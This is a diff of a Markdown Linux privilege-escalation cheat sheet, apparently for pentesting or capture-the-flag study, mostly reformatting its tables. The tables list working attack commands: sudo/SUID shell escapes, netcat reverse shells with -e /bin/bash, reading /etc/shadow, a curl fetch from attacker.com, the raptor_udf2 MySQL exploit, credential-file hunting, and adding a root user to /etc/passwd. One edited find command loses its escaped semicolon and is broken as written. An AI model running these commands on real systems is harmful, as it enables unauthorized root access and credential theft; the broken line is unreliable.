@@ -120,7 +120,7 @@ What executables have SUID bit that can be executed as another user?
   find / -type f -user root -perm /u+s -ls 2>/dev/null
   find / -user root -perm -4000 -print 2>/dev/null
   find / -perm -u=s -type f 2>/dev/null
-  find / -user root -perm -4000 -exec ls -ldb {} \;
+  find / -user root -perm -4000 -exec ls -ldb {};
   ```
 
 Do you have any capabilities available?
@@ -155,40 +155,40 @@ If any of the following commands appear on the list of SUID or SUDO commands, th
 
 | SUID / SUDO Executables               | Priv Esc Command (will need to prefix with sudo if you are using sudo for priv esc. |
 |---------------------------------------|-------------------------------------------------------------------------------------|
-| (ALL : ALL ) ALL                      | You can run any command as root.\ sudo su - \ sudo /bin/bash                    |
-| nmap \ (older versions 2.02 to 5.21)  | nmap --interactive \ !sh                                                           |
-| netcat \ nc \ nc.traditional          | nc -nlvp 4444 & \ nc -e /bin/bash 127.0.0.1 4444                                  |
+| (ALL : ALL ) ALL                      | You can run any command as root.<br> sudo su - <br> sudo /bin/bash                    |
+| nmap <br> (older versions 2.02 to 5.21)  | nmap --interactive <br> !sh                                                           |
+| netcat <br> nc <br> nc.traditional          | nc -nlvp 4444 & <br> nc -e /bin/bash 127.0.0.1 4444                                  |
 | ncat                                  |                                                                                     |
-| awk \ gawk                            | awk '{ print }' /etc/shadow \ awk 'BEGIN {system("id")}'                         |
+| awk <br> gawk                            | awk '{ print }' /etc/shadow <br> awk 'BEGIN {system("id")}'                         |
 | python                                | python -c 'import pty;pty.spawn("/bin/bash")'                                       |
 | php                                   |  CMD="/bin/sh" sudo php -r "system('$CMD');"                                        |
-| find                                  | find /home -exec nc -lvp 4444 -e /bin/bash; \ find /home -exec /bin/bash;           |
+| find                                  | find /home -exec nc -lvp 4444 -e /bin/bash; <br> find /home -exec /bin/bash;           |
 | xxd                                   | LFILE=file_to_read sudo xxd "$LFILE" | xxd -r                                       |
 | vi                                    | sudo vi -c ':!/bin/sh' /dev/null                                                    |
-| more                                  | TERM= sudo more /etc/profile \ !/bin/sh                                         |
-| less                                  | sudo less /etc/profile \ !/bin/sh                                               |
-| nano                                  | sudo nano \ ^R^X \ reset; sh 1>&0 2>&0                                       |
-| cp                                    | sudo cp /bin/sh /bin/cp \ sudo cp                                               |
-| cat                                   | LFILE=file_to_read \ sudo cat "$LFILE"                                          |
+| more                                  | TERM= sudo more /etc/profile <br> !/bin/sh                                         |
+| less                                  | sudo less /etc/profile <br> !/bin/sh                                               |
+| nano                                  | sudo nano <br> ^R^X <br> reset; sh 1>&0 2>&0                                       |
+| cp                                    | sudo cp /bin/sh /bin/cp <br> sudo cp                                               |
+| cat                                   | LFILE=file_to_read <br> sudo cat "$LFILE"                                          |
 | bash                                  | sudo bash                                                                          |
 | ash                                  |  sudo ash                                                                           |
 | sh                                   | |
 | csh                                  | |
-| curl                                 | URL=<http://attacker.com/file_to_get> \ LFILE=file_to_save \ sudo curl $URL -o $LFILE |
+| curl                                 | URL=<http://attacker.com/file_to_get> <br> LFILE=file_to_save <br> sudo curl $URL -o $LFILE |
 | dash                                 | |
-| pico                                 | sudo pico \ ^R^X \ reset; sh 1>&0 2>&0                                         |
-| nano                                 |  sudo nano \ ^R^X \ reset; sh 1>&0 2>&0                                        |
-| tclsh                                | sudo tclsh \ exec /bin/sh <@stdin >@stdout 2>@stderr                              |
-| git                                  | sudo PAGER='sh -c "exec sh 0<&1"' git -p help \ or \ sudo git -p help config \ !/bin/sh |
-| scp                                  | TF=$(mktemp) \ echo `'sh 0<&2 1>&2' > $TF` \ chmod +x "$TF" \ sudo scp -S $TF x y: |
+| pico                                 | sudo pico <br> ^R^X <br> reset; sh 1>&0 2>&0                                         |
+| nano                                 |  sudo nano <br> ^R^X <br> reset; sh 1>&0 2>&0                                        |
+| tclsh                                | sudo tclsh <br> exec /bin/sh <@stdin >@stdout 2>@stderr                              |
+| git                                  | sudo PAGER='sh -c "exec sh 0<&1"' git -p help <br> or <br> sudo git -p help config <br> !/bin/sh |
+| scp                                  | TF=$(mktemp) <br> echo `'sh 0<&2 1>&2' > $TF` <br> chmod +x "$TF" <br> sudo scp -S $TF x y: |
 | expect                               | sudo expect -c 'spawn /bin/sh;interact'                                              |
-| ftp                                  | sudo ftp \ !/bin/sh                                                               |
+| ftp                                  | sudo ftp <br> !/bin/sh                                                               |
 | socat                                | sudo socat stdin exec:/bin/sh                                                        |
 | script                               | sudo script -q /dev/null                                                             |
 | ssh                                  | sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x                                           |
 | zsh                                  | sudo zsh                                                                             |
-| tclsh                                | sudo tclsh \ exec /bin/sh <@stdin >@stdout 2>@stderr                              |
-| strace                               |  Write and compile a a SUID SUID binary c++ program \ strace chown root:root suid \ strace chmod u+s suid \ ./suid        |
+| tclsh                                | sudo tclsh <br> exec /bin/sh <@stdin >@stdout 2>@stderr                              |
+| strace                               |  Write and compile a a SUID SUID binary c++ program <br> strace chown root:root suid <br> strace chmod u+s suid <br> ./suid        |
 | npm                                  |  ln -s /etc/shadow package.json && sudo /usr/bin/npm i *                            |
 | rsync                                |                                                                                     |
 | tar                                  |                                                                                     |
@@ -205,9 +205,9 @@ ps -aux | grep root
 
 | Network Services Running as Root      | Exploit actions                                                                     |
 |---------------------------------------|-------------------------------------------------------------------------------------|
-| mysql                                 | raptor_udf2 exploit \ 0xdeadbeef.info/exploits/raptor_udf2.c \ insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));                   |
+| mysql                                 | raptor_udf2 exploit <br> 0xdeadbeef.info/exploits/raptor_udf2.c <br> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));                   |
 | apache            | drop a reverse shell script on to the webserver                                     |
-| nfs             | no_root_squash parameter \ Or \ if you create the same user name and matching user id as the remote share you can gain access to the files and write new files to the share  |
+| nfs             | no_root_squash parameter <br> Or <br> if you create the same user name and matching user id as the remote share you can gain access to the files and write new files to the share  |
 | PostgreSQL                            | <https://www.exploit-db.com/exploits/45184/>                                          |
 
 Are there any active tmux sessions we can connect to? `tmux ls`
@@ -222,10 +222,10 @@ Are there configuration files that contain credentials?
 
 | Application and config file           | Config File Contents                                                                |
 |---------------------------------------|-------------------------------------------------------------------------------------|
-| WolfCMS \ config.php               | // Database settings: \ define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306'); \ define('DB_USER', 'root'); \ define('DB_PASS', 'john@123');\        |
+| WolfCMS <br> config.php               | // Database settings: <br> define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306'); <br> define('DB_USER', 'root'); <br> define('DB_PASS', 'john@123');<br>        |
 | Generic PHP Web App                   | define('DB_PASSWORD', 's3cret');                                                     |
-| .ssh directory           | authorized_keys \ id_rsa \ id_rsa.keystore \ id_rsa.pub \ known_hosts            |
-| User MySQL Info                 | .mysql_history \ .my.cnf                     |
+| .ssh directory           | authorized_keys <br> id_rsa <br> id_rsa.keystore <br> id_rsa.pub <br> known_hosts            |
+| User MySQL Info                 | .mysql_history <br> .my.cnf                     |
 | User Bash History                  | .bash_history                                      |
 
 Are any of the discovered credentials being reused by multiple acccounts?
@@ -268,7 +268,7 @@ What folder can I write to?
 | Writable Folder / file    | Priv Esc Command                                                                                |
 |---------------------------|-------------------------------------------------------------------------------------------------|
 | /home/*USER*/             | Create an ssh key and copy it to the .ssh/authorized_keys folder the ssh into the account       |
-| /etc/passwd               | manually add a user with a password of "password" using the following syntax \ user:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user:/bin/bash \ You can even escalate to the root user in some cases with the following syntax: \ above admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash                         |
+| /etc/passwd               | manually add a user with a password of "password" using the following syntax <br> user:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user:/bin/bash <br> You can even escalate to the root user in some cases with the following syntax: <br> above admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash                         |
 
 _Root SSH Key_ If Root can login via SSH, then you might be able to find a method of adding a key to the /root/.ssh/authorized_keys file.
 
